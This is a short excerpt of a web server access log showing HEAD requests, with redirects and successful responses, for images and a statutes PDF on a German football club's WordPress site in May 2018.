217.160.63.10 - - [13/May/2018:06:24:05 +0200] "HEAD /wp-content/uploads/2016/01/Tagesablauf_FJ_2016.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:24:05 +0200] "HEAD /wp-content/uploads/2016/01/Tagesablauf_FJ_2016.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:24:10 +0200] "HEAD /wp-content/uploads/2016/01/WF2016_2-300x225.jpg HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:24:10 +0200] "HEAD /wp-content/uploads/2016/01/WF2016_2-300x225.jpg HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
217.160.63.10 - - [13/May/2018:06:24:15 +0200] "HEAD /wp-content/uploads/2014/10/FC-Schnaittach-Satzung-21.03.2015-DIN-A5-final.pdf HTTP/1.1" 301 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
